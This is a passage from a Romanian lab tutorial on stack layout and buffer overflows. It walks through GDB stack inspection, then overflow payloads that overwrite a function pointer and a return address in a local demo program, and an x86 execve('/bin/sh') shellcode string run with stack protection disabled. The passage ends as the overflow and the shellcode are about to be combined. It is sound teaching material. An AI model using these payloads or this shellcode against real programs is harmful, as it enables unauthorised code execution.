După saltul la funcție se execută instrucțiunile din acea funcție. Primele instrucțiuni vor salva pe stivă, după adresa de retur, fostul framepointer (<code>ebp</code>) și vor plasa noul frame pointer în poziția curentă a stivei. Pe stivă vom avea, de sus în jos:
</p>
<ul>
<li class="level1"><div class="li"> adresa de retur</div>
</li>
<li class="level1"><div class="li"> fost frame pointer</div>
</li>
</ul>

<p>
Valoarea actuală a frame pointer-ului referă o adresă unde este stocat frame pointer-ul. Patru octeți mai sus este stocată adresa de retur.
</p>

<p>
Pentru a executa aceste două instrucțiuni rulăm de două ori comanda <code>si</code> (<em>step instruction</em>):
</p>
<pre class="code bash"><span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> si
0x08048540	<span class="nu0">23</span>	<span class="br0">&#123;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> si
0x08048542	<span class="nu0">23</span>	<span class="br0">&#123;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> disassemble 
Dump of assembler code <span class="kw1">for</span> <span class="kw1">function</span> read_data:
   0x0804853f <span class="sy0">&lt;</span>+<span class="nu0">0</span><span class="sy0">&gt;</span>:	push   <span class="sy0">%</span>ebp
   0x08048540 <span class="sy0">&lt;</span>+<span class="nu0">1</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>esp,<span class="sy0">%</span>ebp
=<span class="sy0">&gt;</span> 0x08048542 <span class="sy0">&lt;</span>+<span class="nu0">3</span><span class="sy0">&gt;</span>:	sub    <span class="re4">$0</span>x38,<span class="sy0">%</span>esp
   0x08048545 <span class="sy0">&lt;</span>+<span class="nu0">6</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x804850d,-0xc<span class="br0">&#40;</span><span class="sy0">%</span>ebp<span class="br0">&#41;</span>
   0x0804854c <span class="sy0">&lt;</span>+<span class="nu0">13</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x10,0x8<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x08048554 <span class="sy0">&lt;</span>+<span class="nu0">21</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x41,0x4<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x0804855c <span class="sy0">&lt;</span>+<span class="nu0">29</span><span class="sy0">&gt;</span>:	lea    -0x1c<span class="br0">&#40;</span><span class="sy0">%</span>ebp<span class="br0">&#41;</span>,<span class="sy0">%</span>eax
   0x0804855f <span class="sy0">&lt;</span>+<span class="nu0">32</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>eax,<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x08048562 <span class="sy0">&lt;</span>+<span class="nu0">35</span><span class="sy0">&gt;</span>:	call   0x8048400 <span class="sy0">&lt;</span>memset<span class="sy0">@</span>plt<span class="sy0">&gt;</span>
   <span class="br0">&#91;</span>...<span class="br0">&#93;</span>
<span class="re5">---Type</span> <span class="sy0">&lt;</span><span class="kw3">return</span><span class="sy0">&gt;</span> to <span class="kw3">continue</span>, or q <span class="sy0">&lt;</span><span class="kw3">return</span><span class="sy0">&gt;</span> to quit---q
Quit
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$esp</span>
<span class="re4">$4</span> = <span class="br0">&#40;</span>void <span class="sy0">*</span><span class="br0">&#41;</span> 0xffffd288
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$ebp</span>
<span class="re4">$5</span> = <span class="br0">&#40;</span>void <span class="sy0">*</span><span class="br0">&#41;</span> 0xffffd288
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> x<span class="sy0">/</span>4wx <span class="re1">$ebp</span>
0xffffd288:	0xffffd2b8	0x080485af	0x00000001	0xffffd354</pre>

<p>
În urma acestor pași stack pointer-ul a mai scăzut cu încă un cuvânt de procesor (32 de biți, 4 octeți) la valoare <code>0xffffd288</code>. Frame pointer-ul are aceeași valoare și, pe stivă, se găsește acum:
</p>
<ul>
<li class="level1"><div class="li"> valoarea fostului frame pointer (<code>0xffffd2b8</code>)</div>
</li>
<li class="level1"><div class="li"> adresa de retur a funcției (<code>0x080385af</code>)</div>
</li>
</ul>

<p>
În continuare se rezervă spațiu pe stivă (<code>0x38</code> - 56 de octeți) suficient pentru a acoperi nevoia pointer-ului (de 4 octeți) și a buffer-ului (de 16 octeți). Compilatorul alocă mai puțin spațiu. Stack pointer-ul va fi decrementat cu <code>0x38</code> octeți. Ținând cont de actuala valoare (<code>0xffffd288</code>) rezultă că noua valoare va fi <code>0xffffd288 - 0x38 = 0xffffd250</code>. Verificăm acest lucru executând o nouă instrucțiune, folosind <code>si</code> (<em>step instruction</em>) în GDB:
</p>
<pre class="code bash"><span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> si
<span class="nu0">24</span>		void <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span>void<span class="br0">&#41;</span> = actual_func;
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> disassemble 
Dump of assembler code <span class="kw1">for</span> <span class="kw1">function</span> read_data:
   0x0804853f <span class="sy0">&lt;</span>+<span class="nu0">0</span><span class="sy0">&gt;</span>:	push   <span class="sy0">%</span>ebp
   0x08048540 <span class="sy0">&lt;</span>+<span class="nu0">1</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>esp,<span class="sy0">%</span>ebp
   0x08048542 <span class="sy0">&lt;</span>+<span class="nu0">3</span><span class="sy0">&gt;</span>:	sub    <span class="re4">$0</span>x38,<span class="sy0">%</span>esp
=<span class="sy0">&gt;</span> 0x08048545 <span class="sy0">&lt;</span>+<span class="nu0">6</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x804850d,-0xc<span class="br0">&#40;</span><span class="sy0">%</span>ebp<span class="br0">&#41;</span>
   0x0804854c <span class="sy0">&lt;</span>+<span class="nu0">13</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x10,0x8<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x08048554 <span class="sy0">&lt;</span>+<span class="nu0">21</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x41,0x4<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x0804855c <span class="sy0">&lt;</span>+<span class="nu0">29</span><span class="sy0">&gt;</span>:	lea    -0x1c<span class="br0">&#40;</span><span class="sy0">%</span>ebp<span class="br0">&#41;</span>,<span class="sy0">%</span>eax
   0x0804855f <span class="sy0">&lt;</span>+<span class="nu0">32</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>eax,<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x08048562 <span class="sy0">&lt;</span>+<span class="nu0">35</span><span class="sy0">&gt;</span>:	call   0x8048400 <span class="sy0">&lt;</span>memset<span class="sy0">@</span>plt<span class="sy0">&gt;</span>
   0x08048567 <span class="sy0">&lt;</span>+<span class="nu0">40</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x8048690,<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   <span class="br0">&#91;</span>...<span class="br0">&#93;</span>
<span class="re5">---Type</span> <span class="sy0">&lt;</span><span class="kw3">return</span><span class="sy0">&gt;</span> to <span class="kw3">continue</span>, or q <span class="sy0">&lt;</span><span class="kw3">return</span><span class="sy0">&gt;</span> to quit---q
Quit
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$esp</span>
<span class="re4">$6</span> = <span class="br0">&#40;</span>void <span class="sy0">*</span><span class="br0">&#41;</span> 0xffffd250</pre>

<p>
Se schimbă într-adevăr valoarea stack pointer-ului.
</p>

</div>

<h4 id="adresa_buffer_pe_stiva">Adresă buffer pe stivă</h4>
<div class="level4">

<p>
Vrem să vedem unde este alocat buffer-ul pe stivă. Pe lângă urmărirea codului în assembly, am decis să folosim <code>memset</code> pentru a umple buffer-ul cu valori <code>0x41</code>. Folosim operații <code>ni</code> (next instruction) pentru a trece de apelul <code>memset</code>, adică să ajungem la linia <code>movl   $0x8048690,(%esp)</code>&#039;:
</p>
<pre class="code">(gdb) ni
24		void (*func_ptr)(void) = actual_func;
(gdb) ni
27		memset(buffer, &#039;A&#039;, 16);
(gdb) ni
0x08048554	27		memset(buffer, &#039;A&#039;, 16);
(gdb) ni
0x0804855c	27		memset(buffer, &#039;A&#039;, 16);
(gdb) ni
0x0804855f	27		memset(buffer, &#039;A&#039;, 16);
(gdb) ni
0x08048562	27		memset(buffer, &#039;A&#039;, 16);
(gdb) ni
28		printf(&quot;Insert message (less than 16 bytes): &quot;);
(gdb) disassemble 
Dump of assembler code for function read_data:
   0x0804853f &lt;+0&gt;:	push   %ebp
   0x08048540 &lt;+1&gt;:	mov    %esp,%ebp
   0x08048542 &lt;+3&gt;:	sub    $0x38,%esp
   0x08048545 &lt;+6&gt;:	movl   $0x804850d,-0xc(%ebp)
   0x0804854c &lt;+13&gt;:	movl   $0x10,0x8(%esp)
   0x08048554 &lt;+21&gt;:	movl   $0x41,0x4(%esp)
   0x0804855c &lt;+29&gt;:	lea    -0x1c(%ebp),%eax
   0x0804855f &lt;+32&gt;:	mov    %eax,(%esp)
   0x08048562 &lt;+35&gt;:	call   0x8048400 &lt;memset@plt&gt;
=&gt; 0x08048567 &lt;+40&gt;:	movl   $0x8048690,(%esp)
   0x0804856e &lt;+47&gt;:	call   0x8048390 &lt;printf@plt&gt;
   [...]
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---q</pre>

<p>
În continuare vrem să afișăm conținutul stivei între frame pointer + 4 (unde se găsește adresa de retur) până la poziția curentă a stack pointer-ului. Folosim o expresie <code>while</code> specifică GDB:
</p>
<pre class="code">(gdb) set $pos=0
(gdb) while ($pos &lt;= ($ebp+4-$esp))
 &gt;x/wx $ebp+4-$pos
 &gt;set $pos=$pos+4
 &gt;end
0xffffd28c:	0x080485af
0xffffd288:	0xffffd2b8
0xffffd284:	0x0000002f
0xffffd280:	0xffffd4cf
0xffffd27c:	0x0804850d
0xffffd278:	0x41414141
0xffffd274:	0x41414141
0xffffd270:	0x41414141
0xffffd26c:	0x41414141
0xffffd268:	0xf7e05bf8
0xffffd264:	0xffffd28e
0xffffd260:	0xffffffff
0xffffd25c:	0xf7e8e056
0xffffd258:	0x00000010
0xffffd254:	0x00000041
0xffffd250:	0xffffd26c
(gdb) p $ebp
$1 = (void *) 0xffffd288
(gdb) p $esp
$2 = (void *) 0xffffd250
(gdb) p &amp;func_ptr
$3 = (void (**)(void)) 0xffffd27c
(gdb) p func_ptr
$4 = (void (*)(void)) 0x804850d &lt;actual_func&gt;
(gdb) p &amp;buffer
$5 = (char (*)[16]) 0xffffd26c
(gdb) p buffer
$6 = &#039;A&#039; &lt;repeats 16 times&gt;</pre>

<p>
În listing-ul de mai sus am afișat o parte din stivă, cuprinsă între (<code>ebp+4</code> și <code>esp</code>). Sunt afișate astfel:
</p>
<ul>
<li class="level1"><div class="li"> La adresa <code>0xffffd28c</code> este adresa de retur: <code>0x080485af</code></div>
</li>
<li class="level1"><div class="li"> La adresa <code>0xffffd288</code>, unde pointează și frame pointer-ul <code>ebp</code>, se găsește valoarea fostului frame pointer: <code>0xffffd2b8</code>.</div>
</li>
<li class="level1"><div class="li"> Următoarele două cuvinte de procesor sunt spațiu liber, de gardă.</div>
</li>
<li class="level1"><div class="li"> La adresa <code>0xffffd27c</code> se găsește pointer-ul <code>func_ptr</code> conținând adresa funcției <code>actual_func</code>, adică <code>0x0804850d</code>.</div>
<ul>
<li class="level2"><div class="li"> Acest lucru se poate observa și prin afișarea adresei și valorii simbolului <code>func_ptr</code> în GDB.</div>
</li>
</ul>
</li>
<li class="level1"><div class="li"> La adresa <code>0xffffd26c</code> (16 octeți mai jos) se găsește buffer-ul <code>buffer</code> conținând 16 valori <code>A</code> (adică <code>0x41</code>).</div>
<ul>
<li class="level2"><div class="li"> Acest lucru se poate observa și prin afișarea adresei și valorii simbolului <code>buffer</code> în GDB.</div>
</li>
</ul>
</li>
<li class="level1"><div class="li"> În continuare se găsește spațiu disponibil pe stivă cu valori nerelevante pentru contextul curent.</div>
</li>
</ul>

<p>
Observăm din cele de mai sus cum este așezat buffer-ul pe stivă și faptul că pointer de funcție <code>func_ptr</code> este exact deasupra sa. Practic, dacă facem buffer overflow, am putea suprascrie acel pointer cu o altă valoare.
</p>

</div>
<!-- EDIT5 SECTION "Stiva unui proces" [8585-19524] -->
<h3 class="sectionedit6" id="suprascriere_de_pointer_de_functie">Suprascriere de pointer de funcție</h3>
<div class="level3">

<p>
Un deziderat al unui atac este suprascrierea unui pointer de funcție. Vom face acest lucru direct în cod C, pentru valoare demonstrativă. Vom inițializa în fișierul <code>stack.c</code> la linia 24 pointerul <code>func_ptr</code> la valoarea <code>inject_func</code>.
</p>

<p>
Într-un prim pas, facem acest lucru prin schimbarea liniei 24 de la:
</p>
<pre class="code c">	<span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span> <span class="sy0">=</span> actual_func<span class="sy0">;</span></pre>

<p>
 la 
</p>
<pre class="code c">	<span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span> <span class="sy0">=</span> inject_func<span class="sy0">;</span></pre>

<p>
În acest moment, după compilare, se va afișa mesajul din funcția <code>inject_func</code>:
</p>
<pre class="code bash"><span class="co4">user@host:~$ </span><span class="kw2">make</span>
<span class="kw2">gcc</span> <span class="re5">-Wall</span> <span class="re5">-Wextra</span> <span class="re5">-g</span> <span class="re5">-m32</span> -I..<span class="sy0">/</span>utils  <span class="re5">-c</span> <span class="re5">-o</span> stack.o stack.c
<span class="kw2">gcc</span> <span class="re5">-m32</span>  stack.o   <span class="re5">-o</span> stack
<span class="co4">user@host:~$ </span>.<span class="sy0">/</span>stack 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">16</span> bytes<span class="br0">&#41;</span>: aaa
Call injected function.</pre>

<p>
Un mod mai “barbar” de a obține același lucru, dar mai apropiat de atacul propriu zis este să inițializăm pointer-ul <code>func_ptr</code> la adresa funcției <code>inject_func</code>. Aflăm din executabil adresa funcției <code>inject_func</code>:
</p>
<pre class="code bash">$ objdump <span class="re5">--syms</span> stack <span class="sy0">|</span> <span class="kw2">grep</span> inject_func
08048521 g     F .text	0000001e              inject_func</pre>

<p>
și apoi schimbăm corespunzător linia <code>24</code> din fișierul <code>stack.c</code>:
</p>
<pre class="code c">	<span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span> <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="nu12">0x08048521</span><span class="sy0">;</span></pre>

<p>
Am făcut cast la pointer de funcție <code>void (*)(void)</code> ca să prevenim warning-urile compilatorului.
</p>

<p>
Compilăm și rulăm programul cu efect rularea funcției <code>inject_func</code>:
</p>
<pre class="code">$ make
gcc -Wall -Wextra -g -m32 -I../utils  -c -o stack.o stack.c
gcc -m32  stack.o   -o stack
$ ./stack 
Insert message (less than 16 bytes): ana
Call injected function.</pre>

<p>
În acest fel am forțat apelul unei alte funcții prin inițializarea pointer-ului <code>func_ptr</code> la adresa (în hexazecimal) a acelei funcții.
</p>

</div>
<!-- EDIT6 SECTION "Suprascriere de pointer de funcție" [19525-21305] -->
<h3 class="sectionedit7" id="stack_buffer_overflow_pentru_suprascriere_pointer_de_functie">Stack buffer overflow pentru suprascriere pointer de funcție</h3>
<div class="level3">

<p>
Desigur, ne propunem un atac cât mai realist pentru suprascrierea pointer-ului de fucție <code>func_ptr</code>. Plasarea acestuia pe stivă deasupra buffer-ului <code>buffer</code> așa cum am indicat mai sus face posibilă executarea unui buffer overflow. Transmitem mai mult de 16 octeți la intrarea standard a programului (buffer-ul este definit ca ocupând 16 octeți, dar <code>fgets</code> e apelat greșit - vulnerabilitate) și suprascriem pointer-ul.
</p>

<p>
Pentru ca să transformăm bug-ul în vulnerabilitate trebuie să suprascriem pointer-ul cu o adresă convenabilă, adică adresa funcției <code>inject_func</code>, adică <code>0x08048521</code>.
</p>

<p>
Pentru început refacem programul la starea sa inițială, adică refacem linia <code>24</code> la
</p>
<pre class="code c">	<span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span> <span class="sy0">=</span> actual_func<span class="sy0">;</span></pre>

<p>
 și compilăm programul folosind <code>make</code>.
</p>

<p>
Pentru început haideți să scriem un octet mai mult decât 16 să vedem ce se întâmplă:
</p>
<pre class="code bash">$ <span class="kw3">echo</span> <span class="re5">-n</span> <span class="st_h">'AAAAAAAAAAAAAAAAB'</span> <span class="sy0">|</span> .<span class="sy0">/</span>stack 
Segmentation fault</pre>

<p>
Ce s-a întâmplat este că am suprascris o parte din pointer-ul <code>func_ptr</code> și acesta ia o valorea de salt nepotrivită. Când se execută codul care se presupune că se află la adresa indicată de <code>func_ptr</code> se transmite <em>Segmentation fault</em>.
</p>

<p>
Dorința noastră este să sărim la funcția <code>inject_func</code>. Pentru aceasta, după cei 16 octeți indicați de buffer, vom scrie octeții aferenți adresei funcției <code>inject_func</code> (adică <code>0x21</code>, <code>0x85</code>, <code>0x04</code>, <code>0x08</code> – suntem pe little endian). Acești patru octeți vor suprascrie pointer-ul <code>func_ptr</code> și vor forța saltul la funcția <code>inject_func</code>:
</p>
<pre class="code bash">$ <span class="kw3">echo</span> <span class="re5">-en</span> <span class="st_h">'AAAAAAAAAAAAAAAA\x21\x85\x04\x08'</span> <span class="sy0">|</span> .<span class="sy0">/</span>stack 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">16</span> bytes<span class="br0">&#41;</span>: Call injected function.</pre>

<p>
Observăm că am “deraiat” execuția uzuală a programului, suprascriind un pointer de funcție prin intermediul unui buffer overflow și apelând o altă funcție. Dacă nu am fi generat buffer overflow, adică dacă am fi păstrat datele de intrare sub 16 octeți, programul s-ar fi comportat normal:
</p>
<pre class="code bash">$ <span class="kw3">echo</span> <span class="re5">-en</span> <span class="st_h">'AAAAAAAAAAAAAAA'</span> <span class="sy0">|</span> .<span class="sy0">/</span>stack 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">16</span> bytes<span class="br0">&#41;</span>: Call actual function.
&nbsp;
Read <span class="nu0">15</span> bytes from standard input.</pre>

</div>
<!-- EDIT7 SECTION "Stack buffer overflow pentru suprascriere pointer de funcție" [21306-23577] -->
<h3 class="sectionedit8" id="stack_buffer_overflow_pentru_suprascriere_adresa_de_retur">Stack buffer overflow pentru suprascriere adresă de retur</h3>
<div class="level3">

<p>
Foarte rar vom avea șansa să avem un pointer de funcție plasat convenabil deasupra unui buffer. De aceea unul dintre cele mai uzuale moduri în care putem să schimbăm fluxul de execuție al unui program (descris și în articolul <a href="http://www.phrack.org/issues.html?issue=49&amp;id=14&amp;mode=txt" class="urlextern" title="http://www.phrack.org/issues.html?issue=49&amp;id=14&amp;mode=txt"  rel="nofollow">Smashing the Stack for Fun and Profit</a>) este suprascrierea adresei de retur. Dacă punem acolo o funcție convenabilă, va fi apelată o funcție nouă în loc să revină programul în locul inițial.
</p>

<p>
Pentru a face acest lucru trebuie să știm unde anume se găsește adresa de retur raportat la buffer. De mai sus știm că buffer-ul se găsește la adresa <code>0xffffd26c</code> iar adresa de retur la adresa <code>0xffffd28c</code>. Avem așadar o diferență de <code>0x20 = 32 de octeți</code>. Dacă scriem 32 de caractere de orice fel (fie <code>A</code>) și apoi scriem adresa unei adrese de salt dorite, vom sări la acea adresă. La fel ca mai sus, vom folosi adresa funcției <code>inject_func</code>, adică <code>0x08048521</code>.
</p>

<p>
Pentru acesta vom transmite la intrarea standard 32 de caractere <code>A</code> urmate de caracterele <code>0x21</code>, <code>0x85</code>, <code>0x04</code>, <code>0x08</code> la fel ca mai sus (când am suprascris pointer-ul <code>func_ptr</code>); vom suprascrie așadar valoarea de retur de pe stack frame-ul funcției <code>read_data</code>. Efectul va fi apelarea funcției <code>inject_func</code> la ieșirea din funcția <code>read_data</code>.
</p>

<p>
Întrucât vom suprascrie inclusiv pointer-ul <code>func_ptr</code> vrem să nu mai fie acest apelat. De aceea comentăm linia <code>30</code>:
</p>
<pre class="code c"><span class="co1">//	func_ptr();</span></pre>

<p>
 Apoi compilăm programul modificat folosind <code>make</code>. Vom primi warning de variabilă nefolosită pentru <code>func_ptr</code> dar îl ignorăm.
</p>

<p>
Pentru a genera atacul, rulăm o comandă <code>python</code> ca sa scriem mai ușor mai multe caractere de același tip (32 de caractere <code>A</code>, în cazul nostru) și urmărim efectul:
</p>
<pre class="code bash">$ python <span class="re5">-c</span> <span class="st_h">'print &quot;A&quot;*32 + &quot;\x21\x85\x04\x08&quot;'</span> <span class="sy0">|</span> .<span class="sy0">/</span>stack 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">16</span> bytes<span class="br0">&#41;</span>: Call injected function.</pre>

<p>
Observăm că am alterat fluxul normal de execuție al programului printr-un stack buffer overflow care a suprascris valoarea de retur  a funcției <code>read_data</code>. Prin suprascrierea adresei de retur cu valoarea <code>0x08048521</code> (adresa funcției <code>inject_func</code>) am forțat apelarea funcției <code>inject_func</code>.
</p>

</div>
<!-- EDIT8 SECTION "Stack buffer overflow pentru suprascriere adresă de retur" [23578-25932] -->
<h3 class="sectionedit9" id="shellcode">Shellcode</h3>
<div class="level3">

<p>
De multe ori dorim să injectăm cod în cadrul spațiului de adresă al unui proces, cod pe care apoi să îl executăm. Pentru a face acest lucru se creează mici bucăți de cod scrise direct în cod mașină care vor fi injectate și executate, bucăți denumite shellcode. În general, shellcode-ul are ca obiectiv obținerea unui shell, ceea ce pe Linux echivalează un apel <code>execve(&quot;/bin/sh&quot;)</code>.
</p>

<p>
Pentru a urmări construcția și utilizarea unui shellcode accesăm subdirectorul <code>shellcode/</code> și urmărim conținutul fișierului <code>shellcode.s</code>. Acesta este codificarea în limbaj de asamblare a unui apel de sistem <code>execve</code>. Este echivalent apelului C <code>execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], NULL)</code>.
</p>

<p>
Ca să obținem shell-ul în forma sa binară, fișierul în limbaj de asamblare este compilat, este extrasă partea de cod și apoi transpusă în forma în hexazecimal folosită uzual în C, Python, Perl, Bash. Pentru aceasta folosim scriptul <code>extract-shellcode</code>:
</p>
<pre class="code bash">$ .<span class="sy0">/</span>extract-shellcode 
Shellcode string is: <span class="st_h">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'</span></pre>

<p>
Între apostroafe avem shellcode-ul. Acesta este forma binară (cod mașină) a instrucțiunilor în limbaj de asamblare din <code>shellcode.s</code>.
</p>

<p>
Pentru a folosi, la nivel demonstrativ, shellcode-ul, vom defini o variabilă pe care o vom inițializa la șirul de mai sus. Apoi vom forța saltul la adresa acelei variabile. Aceasta vom face în fișierul <code>run-shellcode.c</code>. La forma actuală a fișierului vom face două modificări:
</p>
<ol>
<li class="level1"><div class="li"> La linia <code>11</code> vom inițializa șirul <code>shellcode</code> la valoarea shellcode-ului. Modificăm linia de la<pre class="code c"><span class="kw4">static</span> <span class="kw4">const</span> <span class="kw4">char</span> shellcode<span class="br0">&#91;</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="st0">&quot;TODO&quot;</span><span class="sy0">;</span></pre>

<p>
 la 
</p>
<pre class="code c"><span class="kw4">static</span> <span class="kw4">const</span> <span class="kw4">char</span> shellcode<span class="br0">&#91;</span><span class="br0">&#93;</span> <span class="sy0">=</span>  <span class="st0">&quot;<span class="es2">\x31</span><span class="es2">\xc0</span><span class="es2">\x50</span><span class="es2">\x68</span><span class="es2">\x2f</span><span class="es2">\x2f</span><span class="es2">\x73</span><span class="es2">\x68</span><span class="es2">\x68</span><span class="es2">\x2f</span><span class="es2">\x62</span><span class="es2">\x69</span><span class="es2">\x6e</span><span class="es2">\x89</span><span class="es2">\xe3</span><span class="es2">\x50</span><span class="es2">\x53</span><span class="es2">\x89</span><span class="es2">\xe1</span><span class="es2">\x31</span><span class="es2">\xd2</span><span class="es2">\xb0</span><span class="es2">\x0b</span><span class="es2">\xcd</span><span class="es2">\x80</span>&quot;</span><span class="sy0">;</span></pre>
</div>
</li>
<li class="level1"><div class="li"> La linia <code>20</code> vom inițializa pointer-ul de funcție <code>func_ptr</code> la adresa shellcode-ului. Modificăm linia de la<pre class="code c">	<span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span> <span class="sy0">=</span> actual_func<span class="sy0">;</span></pre>

<p>
 la 
</p>
<pre class="code c">	<span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>func_ptr<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span> <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span><span class="br0">&#41;</span> shellcode<span class="sy0">;</span></pre>
</div>
</li>
</ol>

<p>
Compilăm programul folosind <code>make</code> și apoi îl apelăm. Întrucât se apelează <code>func_ptr</code> se va apela shellcode, rezultând în apelul echivalent <code>execve(&quot;/bin/sh&quot;)</code> și deci pornirea unui nou shell:
</p>
<pre class="code bash"><span class="co4">user@host:~$ </span><span class="kw2">make</span>
<span class="kw2">gcc</span> <span class="re5">-Wall</span> <span class="re5">-Wextra</span> <span class="re5">-g</span> <span class="re5">-m32</span> <span class="re5">-fno-stack-protector</span> -I..<span class="sy0">/</span>utils  <span class="re5">-c</span> <span class="re5">-o</span> run-shellcode.o run-shellcode.c
<span class="kw2">gcc</span> <span class="re5">-m32</span> <span class="re5">-z</span> execstack  run-shellcode.o   <span class="re5">-o</span> run-shellcode
&nbsp;
<span class="co4">user@host:~$ </span>.<span class="sy0">/</span>run-shellcode 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaa
&nbsp;
$ <span class="kw3">exit</span>
&nbsp;
<span class="co4">user@host:~$ </span></pre>

<p>
Putem observa invocarea apelului de sistem <code>execve</code> prin folosirea strace:
</p>
<pre class="code bash">$ <span class="kw2">strace</span> <span class="re5">-e</span> execve .<span class="sy0">/</span>run-shellcode 
execve<span class="br0">&#40;</span><span class="st0">&quot;./run-shellcode&quot;</span>, <span class="br0">&#91;</span><span class="st0">&quot;./run-shellcode&quot;</span><span class="br0">&#93;</span>, <span class="br0">&#91;</span><span class="sy0">/*</span> <span class="nu0">41</span> vars <span class="sy0">*/</span><span class="br0">&#93;</span><span class="br0">&#41;</span> = <span class="nu0">0</span>
<span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">9084</span> runs <span class="kw1">in</span> <span class="nu0">32</span> bit mode. <span class="br0">&#93;</span>
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaaa
execve<span class="br0">&#40;</span><span class="st0">&quot;/bin//sh&quot;</span>, <span class="br0">&#91;</span><span class="st0">&quot;/bin//sh&quot;</span><span class="br0">&#93;</span>, <span class="br0">&#91;</span><span class="sy0">/*</span> <span class="nu0">0</span> vars <span class="sy0">*/</span><span class="br0">&#93;</span><span class="br0">&#41;</span> = <span class="nu0">0</span>
<span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">9084</span> runs <span class="kw1">in</span> <span class="nu0">64</span> bit mode. <span class="br0">&#93;</span></pre>

<p>
Primul apel <code>execve</code> a însemnat încărcarea executabilului curent <code>run-shellcode</code>, în vreme ce al doilea apel este exact apelul dat de shellcode, care creează un shell nou.
</p>

</div>
<!-- EDIT9 SECTION "Shellcode" [25933-29215] -->
<h3 class="sectionedit10" id="stack_buffer_overflow_cu_shellcode">Stack buffer overflow cu shellcode</h3>
<div class="level3">

<p>
Dorim să supracriem adresa de retur a funcției <code>read_data</code> ca să refere shellcode-ul și să execute codul de acolo. Pentru aceasta trebuie să știm adresa shellcode-ului. Folosim <code>objdump</code>:
</p>
<pre class="code bash">$ objdump <span class="re5">--syms</span> run-shellcode <span class="sy0">|</span> <span class="kw2">grep</span> <span class="st_h">' shellcode'</span>
08048610 l     O .rodata	0000001a              shellcode</pre>

<p>
Nu putem folosi construcția anterioară în care diferența între adresa de retur era de <code>32</code> de octeți. Acum bufferul este mai mare, este definit ca <code>buffer[32]</code>. Vom investiga folosind GDB. De asemenea, vom elimina de tot pointer-ul de funcție <code>func_ptr</code>, în așa fel încât funcția <code>read_data</code> are forma:
</p>
